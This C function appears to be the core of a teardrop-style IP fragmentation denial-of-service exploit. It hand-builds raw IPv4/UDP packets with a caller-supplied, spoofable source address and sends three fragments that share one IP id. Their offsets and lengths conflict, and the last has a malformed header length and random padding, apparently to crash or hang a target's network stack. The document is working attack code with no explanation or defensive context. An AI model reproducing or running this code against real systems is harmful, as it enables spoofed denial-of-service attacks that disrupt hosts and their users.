                    void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                    u_short dst_prt)
                    {
                    int i;
                    u_char *packet = NULL, *p_ptr = NULL; /* packet pointers */
                    u_char byte; /* a byte */
                    struct sockaddr_in sin; /* socket protocol structure */

                    sin.sin_family = AF_INET;
                    sin.sin_port = src_prt;
                    sin.sin_addr.s_addr = dst_ip;

                    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);
                    p_ptr = packet;
                    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

                    byte = 0x45; /* IP version and header length */
                    memcpy(p_ptr, &byte, sizeof(u_char));
                    p_ptr += 2; /* IP TOS (skipped) */
                    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10); /* total length */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(242); /* IP id */
                    p_ptr += 2;
                    *((u_short *)p_ptr) |= FIX(IP_MF); /* IP frag flags and offset */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0x40; /* IP TTL */
                    byte = IPPROTO_UDP;
                    memcpy(p_ptr + 1, &byte, sizeof(u_char));
                    p_ptr += 4; /* IP checksum filled in by kernel */
                    *((u_long *)p_ptr) = src_ip; /* IP source address */
                    p_ptr += 4;
                    *((u_long *)p_ptr) = dst_ip; /* IP destination address */
                    p_ptr += 4;
                    *((u_short *)p_ptr) = htons(src_prt); /* UDP source port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(dst_prt); /* UDP destination port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(8 + 10); /* UDP total length */

                    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
                    sizeof(struct sockaddr)) == -1)
                    {
                    perror("\nsendto");
                    free(packet);
                    exit(1);
                    }

                    p_ptr = packet;
                    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

                    byte = 0x45; /* IP version and header length */
                    memcpy(p_ptr, &byte, sizeof(u_char));
                    p_ptr += 2; /* IP TOS (skipped) */
                    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2); /* total length */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(242); /* IP id */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = FIX(6); /* IP frag flags and offset */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0x40; /* IP TTL */
                    byte = IPPROTO_UDP;
                    memcpy(p_ptr + 1, &byte, sizeof(u_char));
                    p_ptr += 4; /* IP checksum filled in by kernel */
                    *((u_long *)p_ptr) = src_ip; /* IP source address */
                    p_ptr += 4;
                    *((u_long *)p_ptr) = dst_ip; /* IP destination address */
                    p_ptr += 4;
                    *((u_short *)p_ptr) = htons(src_prt); /* UDP source port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(dst_prt); /* UDP destination port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(8 + MAGIC2); /* UDP total length */

                    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
                    sizeof(struct sockaddr)) == -1)
                    {
                    perror("\nsendto");
                    free(packet);
                    exit(1);
                    }

                    p_ptr = packet;
                    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
                    byte = 0x4F; /* IP version and header length */
                    memcpy(p_ptr, &byte, sizeof(u_char));
                    p_ptr += 2; /* IP TOS (skipped) */
                    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40); /* total length */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(242); /* IP id */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0 | FIX(IP_MF); /* IP frag flags and offset */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = 0x40; /* IP TTL */
                    byte = IPPROTO_UDP;
                    memcpy(p_ptr + 1, &byte, sizeof(u_char));
                    p_ptr += 4; /* IP checksum filled in by kernel */
                    *((u_long *)p_ptr) = src_ip; /* IP source address */
                    p_ptr += 4;
                    *((u_long *)p_ptr) = dst_ip; /* IP destination address */
                    p_ptr += 44;
                    *((u_short *)p_ptr) = htons(src_prt); /* UDP source port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(dst_prt); /* UDP destination port */
                    p_ptr += 2;
                    *((u_short *)p_ptr) = htons(8 + PADDING); /* UDP total length */

                    for(i=0;i<PADDING;i++)
                    {
                    p_ptr[i++]=random()%255;
                    } 

                    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
                    sizeof(struct sockaddr)) == -1)
                    {
                    perror("\nsendto");
                    free(packet);
                    exit(1);
                    }
                    free(packet);
                    }